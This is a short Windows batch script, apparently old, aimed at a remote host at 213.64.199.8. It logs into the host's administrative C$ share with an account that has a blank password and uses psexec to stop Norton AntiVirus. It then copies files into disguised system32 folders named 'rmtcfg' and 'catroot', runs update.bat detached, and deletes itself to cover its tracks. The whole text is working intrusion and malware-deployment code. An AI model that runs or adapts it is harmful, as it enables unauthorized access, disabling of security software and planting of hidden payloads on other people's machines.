net use w: /delete
net use \\213.64.199.8 /USER:Gore-home
net use w: \\213.64.199.8\C$
psexec \\213.64.199.8 -u Gore-home -p "" net stop "Norton AntiVirus Server"
psexec \\213.64.199.8 -u Gore-home -p "" -c temp.bat
mkdir w:\winnt\system32\rmtcfg
mkdir w:\winnt\system32\catroot
copy copy\* w:\winnt\system32\rmtcfg
mkdir w:\winnt\system32\rmtcfg\files
mkdir w:\winnt\system32\rmtcfg\files\copy
mkdir w:\winnt\system32\rmtcfg\files\dat
mkdir w:\winnt\system32\rmtcfg\files\log
mkdir w:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* w:\winnt\system32\rmtcfg\files
copy copy\* w:\winnt\system32\rmtcfg\files\copy
copy plugin\* w:\winnt\system32\rmtcfg\files\plugin
copy dat\* w:\winnt\system32\rmtcfg\files\dat
psexec \\213.64.199.8 -u Gore-home -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use w: /delete
net use \\213.64.199.8 /delete
del runme448542.bat
